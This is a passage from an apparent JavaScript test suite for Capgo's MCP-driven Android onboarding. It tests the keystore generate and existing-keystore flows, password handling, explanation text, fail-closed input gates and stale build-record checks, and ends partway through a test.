const { mapAndroidView } = await import('../src/build/onboarding/mcp/engine.ts')
const { androidViewForStep } = await import('../src/build/onboarding/android/flow.ts')

const minimalProgress = {
  platform: 'android',
  appId: 'com.x',
  startedAt: new Date().toISOString(),
  completedSteps: {},
}
const minimalFacts = {
  capacitorProject: true,
  appId: 'com.x',
  platformsDetected: ['android'],
  authenticated: true,
  appRegistered: true,
  androidProgress: minimalProgress,
  iosProgress: null,
}

await test('A2: keystore-method-select → kind:choice with existing+generate, no learn', async () => {
  const view = androidViewForStep('keystore-method-select', minimalProgress, { appId: 'com.x' })
  const result = mapAndroidView(view, minimalFacts)
  eq(result.kind, 'choice', `expected choice, got ${result.kind}`)
  ok(result.options && result.options.length >= 2, 'must have at least 2 options')
  ok(result.options.some(o => o.value === 'existing'), 'must include existing option')
  ok(result.options.some(o => o.value === 'generate'), 'must include generate option')
  ok(!result.options.some(o => o.value === 'learn'), 'must NOT include learn option (filtered for MCP)')
  ok(result.next && result.next.with && 'keystoreMethod' in result.next.with, 'next.with must have keystoreMethod field')
  ok(result.summary && result.summary.includes('com.x'), 'summary must include appId')
})

await test('A2: keystore-existing-store-password → kind:human_gate with keystoreStorePassword collect', async () => {
  const view = androidViewForStep('keystore-existing-store-password', minimalProgress, { appId: 'com.x' })
  const result = mapAndroidView(view, minimalFacts)
  eq(result.kind, 'human_gate', `expected human_gate, got ${result.kind}`)
  ok(result.collect && result.collect.length >= 1, 'must have collect fields')
  eq(result.collect[0].field, 'keystoreStorePassword', `expected field keystoreStorePassword, got ${result.collect[0].field}`)
  ok(result.next && result.next.with && 'keystoreStorePassword' in result.next.with, 'next.with must have keystoreStorePassword')
})

// ─── Task A3: persistAndroidInput — keystore inputs ──────────────────────────

// Helper: build in-memory androidEffectDeps for keystore persist tests
function makeKeystorePersistDeps(initialProgress = null) {
  let _progress = initialProgress
  const effectDeps = {
    ...minimalFakeDeps().androidEffectDeps,
    saveAndroidProgress: async (_appId, prog) => { _progress = prog },
    loadAndroidProgress: async (_appId) => _progress,
    deleteAndroidProgress: async () => { _progress = null },
    readFile: async () => Buffer.from('{"type":"service_account"}'),
  }
  const deps = {
    ...minimalFakeDeps(),
    getAppId: async () => 'com.test.app',
    // Same store as effectDeps — production reads one progress file for both;
    // a null top-level read made the fail-closed gate see 'welcome' (fixture bug).
    loadAndroidProgress: async () => _progress,
    androidEffectDeps: effectDeps,
    _getProgress: () => _progress,
    _setProgress: (p) => { _progress = p },
  }
  return deps
}

// A3 test 1: keystoreMethod:'generate' is recorded into progress
await test('A3: persistAndroidInput({ keystoreMethod:"generate" }) → progress.keystoreMethod==="generate"', async () => {
  const appId = 'com.test.app'
  const deps = makeKeystorePersistDeps({
    platform: 'android',
    appId,
    startedAt: new Date().toISOString(),
    completedSteps: {},
  })
  // Drive via runAdvance with the keystore method input
  await runAdvance(deps, { keystoreMethod: 'generate' })
  const saved = deps._getProgress()
  ok(saved !== null, 'progress must be saved')
  eq(saved.keystoreMethod, 'generate', `expected keystoreMethod=generate, got ${saved.keystoreMethod}`)
})

// A3 test 2: keystorePath is recorded into progress (existing sub-flow)
await test('A3: persistAndroidInput({ keystorePath:"/tmp/x.p12" }) → progress.keystoreExistingPath==="/tmp/x.p12"', async () => {
  const appId = 'com.test.app'
  const deps = makeKeystorePersistDeps({
    platform: 'android',
    appId,
    startedAt: new Date().toISOString(),
    keystoreMethod: 'existing',
    completedSteps: {},
  })
  await runAdvance(deps, { keystorePath: '/tmp/x.p12' })
  const saved = deps._getProgress()
  ok(saved !== null, 'progress must be saved')
  eq(saved.keystoreExistingPath, '/tmp/x.p12', `expected keystoreExistingPath=/tmp/x.p12, got ${saved.keystoreExistingPath}`)
})

// A3 test 3: keystoreNewAlias is recorded → progress.keystoreAlias via keystore-new-alias handler
await test('A3: persistAndroidInput({ keystoreNewAlias:"release" }) → progress.keystoreAlias==="release"', async () => {
  const appId = 'com.test.app'
  const deps = makeKeystorePersistDeps({
    platform: 'android',
    appId,
    startedAt: new Date().toISOString(),
    keystoreMethod: 'generate',
    completedSteps: {},
  })
  await runAdvance(deps, { keystoreNewAlias: 'release' })
  const saved = deps._getProgress()
  ok(saved !== null, 'progress must be saved')
  eq(saved.keystoreAlias, 'release', `expected keystoreAlias=release, got ${saved.keystoreAlias}`)
})

// ─── Task A4: Remove short-circuit + real keystore engine tests ──────────────
//
// These tests use REAL keystore primitives (node-forge) wired into androidEffectDeps
// and a fake writeKeystoreFile that records what was written.
// They prove the MCP bridge drives the interactive keystore flow end-to-end.

import { tmpdir } from 'node:os'
import { writeFile, readFile as fsReadFile, mkdir } from 'node:fs/promises'
import { join as pathJoin } from 'node:path'
import { generateKeystore as realGenerateKeystore, listKeystoreAliases as realListKeystoreAliases, tryUnlockPrivateKey as realTryUnlockPrivateKey, generateRandomPassword as realGenerateRandomPassword } from '../src/build/onboarding/android/keystore.ts'

// Build fake deps that use REAL keystore primitives but fake everything else
function makeRealKeystoreDeps(overrides = {}) {
  let _androidProgress = null
  let _writtenKeystorePath = null
  let _writtenKeystoreBase64 = null

  const tmpDir = pathJoin(tmpdir(), `mcp-keystore-test-${Date.now()}-${Math.random().toString(36).slice(2)}`)

  const effectDeps = {
    // REAL keystore primitives
    generateKeystore: realGenerateKeystore,
    listKeystoreAliases: realListKeystoreAliases,
    tryUnlockPrivateKey: realTryUnlockPrivateKey,

    validateServiceAccountJson: async () => ({
      ok: true,
      serviceAccountEmail: 'sa@proj-1.iam.gserviceaccount.com',
      projectId: 'proj-1',
    }),

    updateSavedCredentials: async () => {},
    loadSavedCredentials: async () => null,

    saveAndroidProgress: async (_appId, prog) => { _androidProgress = prog },
    loadAndroidProgress: async (_appId) => _androidProgress,
    deleteAndroidProgress: async () => { _androidProgress = null },

    // Real file reads (for when effect needs to read the generated .p12)
    readFile: async (path) => {
      return fsReadFile(path)
    },
    copyFile: async () => {},

    runOAuthFlow: async () => { throw new Error('runOAuthFlow must not be called') },
    fetchUserInfo: async () => ({ email: 'u@x.com', sub: 'sub123' }),
    getAccessToken: async () => 'tok',
    revokeToken: async () => {},
    listProjects: async () => [],
    createProject: async () => { throw new Error('createProject not expected') },
    enableService: async () => {},
    ensureServiceAccount: async () => { throw new Error('ensureServiceAccount not expected') },
    createServiceAccountKey: async () => { throw new Error('createServiceAccountKey not expected') },
    inviteServiceAccount: async () => {},
    findAndroidApplicationIds: async () => ['com.x'],
    startOAuthFlow: async () => ({ authUrl: 'https://auth', redirectUri: 'http://127.0.0.1/callback', result: new Promise(() => {}), close() {} }),
  }

  // writeKeystoreFile: writes to a tmp dir, records path + base64
  const writeKeystoreFile = async (appId, base64, alias) => {
    await mkdir(tmpDir, { recursive: true })
    const filePath = pathJoin(tmpDir, `${alias}.p12`)
    const bytes = Buffer.from(base64, 'base64')
    await writeFile(filePath, bytes)
    _writtenKeystorePath = filePath
    _writtenKeystoreBase64 = base64
    return filePath
  }

  const deps = {
    cwd: tmpDir,
    hasSavedKey: () => true,
    getAppId: async () => 'com.x',
    detectPlatforms: async () => ['android'],
    isAppRegistered: async () => true,
    loadProgress: async () => null,
    loadAndroidProgress: async () => _androidProgress,
    registerApp: async () => ({ ok: true }),
    setAndroidServiceAccountPath: async () => {},
    readBuildRecord: async () => null,
    buildRecordPath: (appId, platform) => pathJoin(tmpDir, `build-record-${appId}-${platform}.json`),
    setIosApiKey: async () => {},
    finalizeIosCredentials: async () => ({ ok: true }),
    androidEffectDeps: effectDeps,
    oauthSession: {
      begin: async () => ({ signInUrl: 'https://api.capgo.app/builder_auth_direct/google/start?s=X' }),
      poll: () => ({ status: 'absent' }),
      clear: () => {},
    },
    canLaunchTerminal: () => false,
    launchBuildInTerminal: async () => ({ ok: false, error: 'not implemented' }),
    writeKeystoreFile,
    _getAndroidProgress: () => _androidProgress,
    _setAndroidProgress: (p) => { _androidProgress = p },
    _getWrittenKeystorePath: () => _writtenKeystorePath,
    _getWrittenKeystoreBase64: () => _writtenKeystoreBase64,
    _tmpDir: tmpDir,
    ...overrides,
  }
  return deps
}

// A4 Test 1: no keystoreReady progress → first decision is keystore-method-select (NOT android-keystore auto)
await test('A4: null android progress → first decision is keystore-method-select (short-circuit removed)', async () => {
  const deps = makeRealKeystoreDeps()
  const facts = {
    capacitorProject: true,
    appId: 'com.x',
    platformsDetected: ['android'],
    authenticated: true,
    appRegistered: true,
    androidProgress: null,
    iosProgress: null,
  }
  const r = await decideAndroid(facts, deps)
  eq(r.state, 'keystore-method-select', `expected keystore-method-select, got ${r.state} (short-circuit must be removed)`)
  eq(r.kind, 'choice', `expected kind:choice, got ${r.kind}`)
  ok(r.options && r.options.some(o => o.value === 'generate'), 'must have generate option')
  ok(r.options && r.options.some(o => o.value === 'existing'), 'must have existing option')
  ok(!r.options.some(o => o.value === 'learn'), 'must NOT have learn option (filtered for MCP)')
})

// A4 Test 2: generate path — drive through full generate sub-flow → service-account-method-select + .p12 written
await test('A4: generate path → drive keystoreMethod:generate → ... → service-account-method-select + real .p12 written', async () => {
  const deps = makeRealKeystoreDeps()

  // Turn 0 (contract change, hostile-review 2026-06-12): render keystore-method-select
  // first — it seeds the progress file; the fail-closed gate rejects answers to
  // never-rendered questions (the data-safety-gate jump).
  await runAdvance(deps, {})
  // Turn 1: keystoreMethod:'generate' → should reach keystore-new-alias
  const r1 = await runAdvance(deps, { keystoreMethod: 'generate' })
  eq(r1.state, 'keystore-new-alias', `expected keystore-new-alias after keystoreMethod:generate, got ${r1.state}`)
  eq(r1.kind, 'human_gate')
  // NEW: picking "generate" (the user has no keystore) reassures them a keystore
  // FILE will be created and saved to disk for them — they "will receive" one.
  ok(/file|disk|save|create/i.test(`${r1.summary} ${JSON.stringify(r1.human ?? '')}`),
    'keystore-new-alias reassures the user a keystore file will be created and saved to disk')

  // Turn 2: keystoreNewAlias:'release' → keystore-new-password-method
  const r2 = await runAdvance(deps, { keystoreNewAlias: 'release' })
  eq(r2.state, 'keystore-new-password-method', `expected keystore-new-password-method, got ${r2.state}`)
  eq(r2.kind, 'choice')

  // Turn 3: keystorePasswordMethod:'random' → keystore-new-cn (passwords auto-generated)
  const r3 = await runAdvance(deps, { keystorePasswordMethod: 'random' })
  eq(r3.state, 'keystore-new-cn', `expected keystore-new-cn after random password, got ${r3.state}`)
  eq(r3.kind, 'human_gate')
  // NEW: the generated password is surfaced IMMEDIATELY at keystore-new-cn (right
  // after picking random), not several steps later — so the user receives it the
  // moment they chose random and can't miss it.
  const progAfterRandom = deps._getAndroidProgress()
  ok(progAfterRandom.keystorePasswordGenerated === true, 'random marks keystorePasswordGenerated')
  eq(r3.context && r3.context.keystorePassword, progAfterRandom.keystoreStorePassword,
    'keystore-new-cn surfaces the generated password immediately (the moment the user picks random)')
  ok(/password/i.test(r3.summary || ''),
    'keystore-new-cn summary tells the user their generated password is ready')

  // Turn 4: keystoreCommonName:'com.x' → runs real generateKeystore → service-account-method-select
  const r4 = await runAdvance(deps, { keystoreCommonName: 'com.x' })
  eq(r4.state, 'service-account-method-select', `expected service-account-method-select after CN, got ${r4.state}`)
  eq(r4.kind, 'choice')

  // Assert: writeKeystoreFile was called and real .p12 exists
  const writtenPath = deps._getWrittenKeystorePath()
  ok(writtenPath !== null, 'writeKeystoreFile must have been called')

  // Assert: the written .p12 is a valid PKCS#12 that listKeystoreAliases can open
  const p12Bytes = await fsReadFile(writtenPath)
  const savedProgress = deps._getAndroidProgress()
  ok(savedProgress && savedProgress.completedSteps && savedProgress.completedSteps.keystoreReady,
    'progress must have keystoreReady')
  ok(savedProgress._keystoreBase64, 'progress must have _keystoreBase64')
  const listed = realListKeystoreAliases(p12Bytes, savedProgress.keystoreStorePassword)
  ok(listed.ok, `listKeystoreAliases must succeed on written .p12, got: ${JSON.stringify(listed)}`)
  ok(listed.aliases && listed.aliases.includes('release'), `must find alias "release", got: ${JSON.stringify(listed.aliases)}`)

  // Assert: the RANDOM-generated password IS surfaced (A3) — the user never typed
  // it, so they must be shown it to save alongside the keystore.
  ok(savedProgress.keystorePasswordGenerated === true,
    'random method must mark keystorePasswordGenerated')
  eq(r4.context && r4.context.keystorePassword, savedProgress.keystoreStorePassword,
    'service-account-method-select must surface the auto-generated password in context.keystorePassword')
  ok((r4.summary || '').includes(savedProgress.keystoreStorePassword),
    'summary must surface the auto-generated keystore password')

  // Assert: context.keystorePath is set to the file path
  ok(r4.context && r4.context.keystorePath, 'service-account-method-select result must include context.keystorePath')
})

// A4 Test 3: provide path — drive existing keystore → service-account-method-select (real validation)
await test('A4: provide path → drive keystoreMethod:existing with real .p12 → service-account-method-select', async () => {
  // Pre-generate a real .p12 to a temp file
  const storePassword = 'TestStore123!'
  const alias = 'mykey'
  const ksResult = realGenerateKeystore({
    alias,
    storePassword,
    keyPassword: storePassword, // same key and store pw (probe succeeds)
    dname: { commonName: 'com.x' },
  })
  const tmpFile = pathJoin(tmpdir(), `provide-test-${Date.now()}.p12`)
  await writeFile(tmpFile, ksResult.p12Bytes)

  // Use makeRealKeystoreDeps directly — its effectDeps already uses real primitives
  // and a proper in-memory progress store.
  const deps = makeRealKeystoreDeps()

  // Turn 0 (contract change, hostile-review 2026-06-12): render keystore-method-select
  // first — it seeds the progress file; the fail-closed gate rejects answers to
  // never-rendered questions (the data-safety-gate jump).
  await runAdvance(deps, {})
  // Turn 1: keystoreMethod:'existing'
  const r1 = await runAdvance(deps, { keystoreMethod: 'existing' })
  eq(r1.state, 'keystore-existing-path', `expected keystore-existing-path, got ${r1.state}`)

  // Turn 2: keystorePath → keystore-existing-store-password
  const r2 = await runAdvance(deps, { keystorePath: tmpFile })
  eq(r2.state, 'keystore-existing-store-password', `expected keystore-existing-store-password, got ${r2.state}`)

  // Turn 3: correct store password → effect runs listKeystoreAliases → single alias → keystore-existing-key-password
  // → probe: tryUnlockPrivateKey with storePassword succeeds (key pw == store pw) → service-account-method-select
  const r3 = await runAdvance(deps, { keystoreStorePassword: storePassword })
  // Should advance to service-account-method-select (all probing succeeds)
  eq(r3.state, 'service-account-method-select', `expected service-account-method-select after correct password, got ${r3.state}`)
  eq(r3.kind, 'choice')
})

// A4 Test 4: wrong password → re-prompt store-password (NOT service-account-method-select, no crash)
await test('A4: wrong password → re-prompts keystore-existing-store-password (NOT service-account-method-select)', async () => {
  // Pre-generate a real .p12
  const storePassword = 'RealPassword456!'
  const alias = 'wrongpw'
  const ksResult = realGenerateKeystore({
    alias,
    storePassword,
    keyPassword: storePassword,
    dname: { commonName: 'com.x' },
  })
  const tmpFile = pathJoin(tmpdir(), `wrong-pw-test-${Date.now()}.p12`)
  await writeFile(tmpFile, ksResult.p12Bytes)

  // Use makeRealKeystoreDeps directly — real primitives, in-memory progress store.
  const deps = makeRealKeystoreDeps()

  // Turn 0 (contract change, hostile-review 2026-06-12): render keystore-method-select
  // first — it seeds the progress file; the fail-closed gate rejects answers to
  // never-rendered questions (the data-safety-gate jump).
  await runAdvance(deps, {})
  // Turn 1: keystoreMethod:'existing'
  await runAdvance(deps, { keystoreMethod: 'existing' })

  // Turn 2: keystorePath
  await runAdvance(deps, { keystorePath: tmpFile })

  // Turn 3: WRONG password → listKeystoreAliases returns wrong-password → re-prompt store password
  const r3 = await runAdvance(deps, { keystoreStorePassword: 'WrongPassword!!!' })

  // Must re-prompt for store password, NOT advance
  eq(r3.state, 'keystore-existing-store-password',
    `expected keystore-existing-store-password re-prompt, got ${r3.state}`)
  eq(r3.kind, 'human_gate', `expected human_gate for re-prompt, got ${r3.kind}`)
  ok(r3.collect && r3.collect.some(c => c.field === 'keystoreStorePassword'),
    'must collect keystoreStorePassword again')

  // Must NOT have advanced to service-account-method-select
  ok(r3.state !== 'service-account-method-select', 'must NOT advance to service-account-method-select on wrong password')

  // Assert no crash — test itself not throwing is the proof
})

await test('A: rendered service-account result tells the user where the keystore was saved', async () => {
  const { renderResult } = await import('../src/build/onboarding/mcp/contract.ts')
  // a NextStepResult shaped like the service-account-method-select step with a written path
  const result = {
    onboarding: 'capgo-builder', phase: 'credentials', platform: 'android',
    state: 'service-account-method-select', progress: 60, kind: 'choice',
    summary: '✓ Keystore created and saved to /demo/android/app/release.p12 — keep this file safe (you will need it for every release). Now, how do you want to connect Google Play?',
    options: [{ value: 'generate', label: 'x' }, { value: 'existing', label: 'y' }],
    context: { keystorePath: '/demo/android/app/release.p12' },
    next: { tool: 'capgo_builder_onboarding_next_step', instruction: 'x' },
  }
  const text = renderResult(result)
  ok(text.includes('/demo/android/app/release.p12'), 'path must appear in human-facing text, not only the JSON blob')
  // belt-and-suspenders: even if a future summary omits it, the context line surfaces it
  const noSummaryPath = renderResult({ ...result, summary: 'Keystore ready. How do you want to connect Google Play?' })
  const beforeJson = noSummaryPath.split('---')[0]
  ok(beforeJson.includes('/demo/android/app/release.p12'), 'context.keystorePath must render as a human line before the JSON')
})

await test('C-data: explainForState — rich content for key states + broad coverage + fallback', async () => {
  const { explainForState, EXPLANATIONS } = await import('../src/build/onboarding/mcp/explanations.ts')

  // Pinned content for the four highest-value states (what the live AI struggled with):
  ok(/sign/i.test(explainForState('keystore-method-select')), 'keystore explanation mentions signing')
  const pm = explainForState('keystore-new-password-method')
  ok(/random/i.test(pm) && /manual/i.test(pm), 'password-method explains random vs manual')
  const sa = explainForState('service-account-method-select')
  ok(/google play/i.test(sa) && /(upload|publish|permission)/i.test(sa), 'SA explanation: lets Capgo upload/publish to Google Play')
  const plat = explainForState('platform-select')
  ok(/ios/i.test(plat) && /android/i.test(plat), 'platform explanation names iOS + Android')

  // Broad coverage: a representative sample across ALL branches must be authored + substantial.
  const mustHave = [
    'platform-select', 'ios-api-key',
    'keystore-method-select', 'keystore-existing-path', 'keystore-existing-store-password',
    'keystore-new-alias', 'keystore-new-password-method', 'keystore-new-cn',
    'service-account-method-select', 'sa-json-existing-path', 'google-sign-in',
    'play-developer-id-input', 'gcp-projects-select', 'gcp-project-create-name', 'android-package-select',
    'build-ready', 'ask-ci-secrets', 'ask-github-actions-setup', 'ask-export-env',
  ]
  for (const s of mustHave)
    ok(typeof EXPLANATIONS[s] === 'string' && EXPLANATIONS[s].length > 40, `explanation for ${s} must be authored + substantial`)

  // Auto/transient states intentionally fall back (not bespoke). S6b made the
  // iOS 'error' state a USER-FACING recovery menu, so it moved OUT of this
  // list into the bespoke set (asserted below).
  for (const s of ['keystore-generating', 'gcp-setup-running', 'gcp-projects-loading', 'welcome', 'revoking-certificate', 'deleting-duplicate-profiles'])
    ok(!Object.prototype.hasOwnProperty.call(EXPLANATIONS, s), `${s} should NOT have a bespoke explanation (fallback-only)`)

  // S6b recovery states are user-facing decisions → authored + substantial.
  for (const s of ['cert-limit-prompt', 'duplicate-profile-prompt', 'error'])
    ok(typeof EXPLANATIONS[s] === 'string' && EXPLANATIONS[s].length > 40, `explanation for ${s} must be authored + substantial (S6b recovery)`)
  ok(/revok/i.test(explainForState('cert-limit-prompt')), 'cert-limit explanation mentions revoking')
  const errX = explainForState('error')
  ok(/retry/i.test(errX) && /restart/i.test(errX) && /support/i.test(errX), 'error explanation names the recovery options')

  // Unknown state → non-empty fallback.
  ok(explainForState('totally-unknown').length > 20, 'fallback is non-empty')
})

await test('C-tool: explainOnboarding returns the explanation for the current state, read-only', async () => {
  const { explainOnboarding } = await import('../src/build/onboarding/mcp/engine.ts')
  // Build deps that would THROW if any effect ran (registerApp / writeKeystoreFile / androidEffectDeps).
  const deps = androidBridgeDeps({
    // explicit state override path:
  })
  // Explicit state arg → deterministic
  const sa = await explainOnboarding(deps, { state: 'service-account-method-select' })
  ok(typeof sa === 'string' && /google play/i.test(sa), 'explicit state returns that explanation')
  // No-arg → resolves current state from facts/progress (androidBridgeDeps starts at keystore-method-select with empty progress)
  const cur = await explainOnboarding(deps)
  ok(typeof cur === 'string' && cur.length > 20, 'no-arg resolves a current-state explanation')
})

await test('C-tool: explainOnboarding never runs side effects', async () => {
  const { explainOnboarding } = await import('../src/build/onboarding/mcp/engine.ts')
  let effectsRan = false
  const deps = androidBridgeDeps()
  // wrap every write/effect dep to flip the flag if called
  const guarded = {
    ...deps,
    registerApp: async () => { effectsRan = true; return { ok: true } },
    writeKeystoreFile: async () => { effectsRan = true; return '/should/not/happen.p12' },
    finalizeIosCredentials: async () => { effectsRan = true; return { ok: true } },
  }
  await explainOnboarding(guarded, { state: 'keystore-method-select' })
  await explainOnboarding(guarded)
  ok(effectsRan === false, 'explain must not call registerApp / writeKeystoreFile / finalize')
})

await test('B: service-account options are plain-language (no bare "set one up via Google")', async () => {
  const { androidViewForStep } = await import('../src/build/onboarding/android/flow.ts')
  const view = androidViewForStep('service-account-method-select', null, {})
  const labels = (view.options ?? []).map(o => o.label).join(' | ')
  ok(/recommended/i.test(labels), 'generate option should be marked recommended')
  ok(/sign in with google|google sign|configure.*play|play access/i.test(labels), 'generate label should explain the Google sign-in sets up Play access')
  ok(/already have.*service.account|json file/i.test(labels), 'existing label should explain it is for users who already have a JSON')
  ok(!/^No, set one up for me via Google$/.test(labels), 'must not keep the old terse label verbatim')
})

await test('A1: after picking android, a next_step WITHOUT platform stays in the android flow', async () => {
  const { runAdvance } = await import('../src/build/onboarding/mcp/engine.ts')
  const deps = androidBridgeDeps({ detectPlatforms: async () => ['ios', 'android'] })
  // 1) pick android → should land on keystore-method-select
  const r1 = await runAdvance(deps, { platform: 'android' })
  ok(r1.state === 'keystore-method-select', `expected keystore-method-select, got ${r1.state}`)
  // 2) answer the keystore-method question WITHOUT re-sending platform
  const r2 = await runAdvance(deps, { keystoreMethod: 'generate' })
  ok(r2.platform === 'android' || /keystore/.test(r2.state), `must stay in android flow, got state=${r2.state} platform=${r2.platform}`)
  ok(r2.state !== 'platform-select', 'must NOT reset to platform-select when platform is omitted mid-flow')
})

await test('A2: a mega-call at keystore-method is rejected with a correction (no advance, no apply)', async () => {
  const { runAdvance } = await import('../src/build/onboarding/mcp/engine.ts')
  const deps = androidBridgeDeps({ detectPlatforms: async () => ['ios', 'android'] })
  await runAdvance(deps, { platform: 'android' }) // → keystore-method-select
  // mega-call: tries to answer keystore-method AND pre-answer alias + password + cn
  const r = await runAdvance(deps, { keystoreMethod: 'generate', keystoreNewAlias: 'release', keystorePasswordMethod: 'random', keystoreCommonName: 'com.x' })
  ok(r.state === 'keystore-method-select', `must NOT advance past keystore-method-select; got ${r.state}`)
  ok(/only|one field|remove|extra/i.test(r.summary + JSON.stringify(r.next || {})), 'must include a corrective instruction about one field per step')
})

await test('A2: a non-answer (no relevant field) does not advance', async () => {
  const { runAdvance } = await import('../src/build/onboarding/mcp/engine.ts')
  const deps = androidBridgeDeps({ detectPlatforms: async () => ['ios', 'android'] })
  await runAdvance(deps, { platform: 'android' }) // → keystore-method-select
  const r = await runAdvance(deps, {}) // plain continue, no answer
  ok(r.state === 'keystore-method-select', `non-answer must re-ask the same step; got ${r.state}`)
})

await test('A2: the correct single-field call DOES advance', async () => {
  const { runAdvance } = await import('../src/build/onboarding/mcp/engine.ts')
  const deps = androidBridgeDeps({ detectPlatforms: async () => ['ios', 'android'] })
  await runAdvance(deps, { platform: 'android' })          // → keystore-method-select
  const r = await runAdvance(deps, { keystoreMethod: 'generate' }) // single field → advance
  ok(r.state === 'keystore-new-alias', `expected keystore-new-alias, got ${r.state}`)
})

await test('A2-fix: the MANUAL keystore flow accepts the store password at keystore-new-store-password and advances', async () => {
  const { runAdvance } = await import('../src/build/onboarding/mcp/engine.ts')
  const deps = androidBridgeDeps({ detectPlatforms: async () => ['ios', 'android'] })
  await runAdvance(deps, { platform: 'android' })            // keystore-method-select
  await runAdvance(deps, { keystoreMethod: 'generate' })      // keystore-new-alias
  await runAdvance(deps, { keystoreNewAlias: 'release' })     // keystore-new-password-method
  const rManual = await runAdvance(deps, { keystorePasswordMethod: 'manual' }) // advances to the store-password step
  ok(rManual.state === 'keystore-new-store-password', `manual advances to keystore-new-store-password, got ${rManual.state}`)
  // NEW: the manual store-password gate must STRONGLY signal it is fine to paste
  // the password directly in the chat (no "don't paste secrets" friction).
  ok(/chat/i.test(`${JSON.stringify(rManual.human ?? '')} ${JSON.stringify(rManual.collect ?? '')}`),
    'manual store-password gate tells the AI it is 100% fine to paste the password in the chat')
  // The store password is the legit answer at this step — must NOT be rejected.
  const rStore = await runAdvance(deps, { keystoreStorePassword: 'MyStorePass123' })
  ok(rStore.state !== 'keystore-new-store-password' || !/only accepts/.test(rStore.summary), `store password must be accepted, got state=${rStore.state} summary=${(rStore.summary||'').slice(0,60)}`)
  // The flow must reach the common-name / key-password / service-account step.
  ok(['keystore-new-cn', 'keystore-new-key-password', 'service-account-method-select'].includes(rStore.state), `manual flow must advance past password, got ${rStore.state}`)
})

await test('keystore-method-select warns a NEW keystore breaks an already-published app (Play rejects unless upload key reset)', async () => {
  const { runAdvance } = await import('../src/build/onboarding/mcp/engine.ts')
  const deps = androidBridgeDeps({ detectPlatforms: async () => ['ios', 'android'] })
  const r = await runAdvance(deps, { platform: 'android' })
  eq(r.state, 'keystore-method-select', `expected keystore-method-select, got ${r.state}`)
  const text = `${r.summary || ''} ${JSON.stringify(r.next ?? '')}`
  ok(/google play/i.test(text), 'must mention Google Play')
  ok(/reject/i.test(text), 'must warn Google Play will REJECT a new-keystore upload for an already-published app')
  ok(/upload key|play console|app signing/i.test(text), 'must point the user to the Play Console upload-key reset')
  ok(/never been uploaded|first build|already (been )?(published|uploaded)|published this app|shipped/i.test(text),
    'must distinguish first build (safe to generate) from an already-published app (must reuse existing keystore)')
})

await test('B-fix: the MANUAL keystore choice advances to a distinct keystore-new-store-password state', async () => {
  const { runAdvance } = await import('../src/build/onboarding/mcp/engine.ts')
  const deps = androidBridgeDeps({ detectPlatforms: async () => ['ios', 'android'] })
  await runAdvance(deps, { platform: 'android' })            // keystore-method-select
  await runAdvance(deps, { keystoreMethod: 'generate' })      // keystore-new-alias
  await runAdvance(deps, { keystoreNewAlias: 'release' })     // keystore-new-password-method
  // Picking "manual" must NOT freeze on the choice screen — the stateless MCP
  // must advance to the dedicated store-password input so the step title changes.
  const rManual = await runAdvance(deps, { keystorePasswordMethod: 'manual' })
  ok(rManual.state === 'keystore-new-store-password', `manual must advance to keystore-new-store-password, got ${rManual.state}`)
})

await test('A3: random-generated keystore surfaces the password to the user', async () => {
  const { renderResult } = await import('../src/build/onboarding/mcp/contract.ts')
  const result = {
    onboarding: 'capgo-builder', phase: 'credentials', platform: 'android',
    state: 'service-account-method-select', progress: 60, kind: 'choice',
    summary: 'x',
    context: { keystorePath: '/demo/android/app/release.p12', keystorePassword: 'Gen3r4t3dPw!' },
    options: [{ value: 'generate', label: 'a' }], next: { tool: 'x', instruction: 'y' },
  }
  const text = renderResult(result)
  const beforeJson = text.split('---')[0]
  ok(beforeJson.includes('Gen3r4t3dPw!'), 'rendered text must show the keystore password (human line, not only JSON)')
})

// ─── Hostile-review fixes (2026-06-12) ────────────────────────────────────────
// Build-phase preconditions + stale-record correlation, the __manual__ package
// sentinel, the invalid-playDeveloperId corrective, OAuth error containment,
// the fail-closed android input gate, and production-deps hardening.

// Progress carrying the post-save marker the real tail save writes
// (completedSteps.credentialsSaved) — the state decideBuildPhase actually
// renders from in the live flow. buildReadyProgress() (above) deliberately
// lacks it, modeling a flow that never reached the save.
function savedBuildReadyProgress() {
  const p = buildReadyProgress()
  return { ...p, completedSteps: { ...p.completedSteps, credentialsSaved: { savedAt: new Date().toISOString() } } }
}

await test('hostile: runBuild:true WITHOUT a credentials-saved marker → build-not-ready error, no hand-off/launch', async () => {
  let launched = false
  const deps = androidBridgeDeps({
    canLaunchTerminal: () => true,
    launchBuildInTerminal: async () => {
      launched = true
      return { ok: true }
    },
  })
  deps._setAndroidProgress(buildReadyProgress()) // every credential step done, but nothing saved yet
  const r = await runAdvance(deps, { runBuild: true, platform: 'android' })
  eq(r.kind, 'error', `expected error, got ${r.kind} (state ${r.state})`)
  eq(r.state, 'build-not-ready', `expected build-not-ready, got ${r.state}`)
  ok(!launched, 'launchBuildInTerminal must NOT be called without saved credentials')
})

await test('hostile: runBuild:true WITH the credentials-saved marker → use-start-tool corrective (no terminal hand-off)', async () => {
  const deps = androidBridgeDeps()
  deps._setAndroidProgress(savedBuildReadyProgress())
  const r = await runAdvance(deps, { runBuild: true, platform: 'android' })
  eq(r.kind, 'error', `expected error, got ${r.kind}`)
  eq(r.state, 'build-use-start-tool', `expected build-use-start-tool, got ${r.state}`)
  eq(r.next.tool, 'start_capgo_build', 'corrective must point at start_capgo_build')
  eq(r.next.with.platform, 'android', 'next.with.platform must be android')
})

await test('hostile: checkBuild rejects a record for a DIFFERENT appId (stale record, never build-complete)', async () => {
  const staleRecord = {
    schemaVersion: 1, jobId: 'j-old', appId: 'com.other.app', platform: 'android', buildMode: 'release',
    status: 'success', outputUrl: 'https://capgo.app/d/old', qrCodeAscii: null, qrCodePngPath: null, finishedAt: new Date().toISOString(),
  }
  const deps = androidBridgeDeps({ readBuildRecord: async () => staleRecord })
  deps._setAndroidProgress(savedBuildReadyProgress())
  const r = await runAdvance(deps, { checkBuild: true })
  ok(r.state !== 'build-complete', 'a record for another app must never complete this onboarding')
  eq(r.state, 'build-stale-record', `expected build-stale-record, got ${r.state}`)
  eq(r.kind, 'error')
  ok(/com\.other\.app|stale/i.test(r.summary), 'summary must say the record belongs to another app')
})

await test('hostile: checkBuild rejects a record for a DIFFERENT platform (stale record)', async () => {
  const staleRecord = {
    schemaVersion: 1, jobId: 'j-old', appId: 'com.acme.app', platform: 'ios', buildMode: 'release',
    status: 'success', outputUrl: 'https://capgo.app/d/old', qrCodeAscii: null, qrCodePngPath: null, finishedAt: new Date().toISOString(),
  }
  const deps = androidBridgeDeps({ readBuildRecord: async () => staleRecord })
  deps._setAndroidProgress(savedBuildReadyProgress())
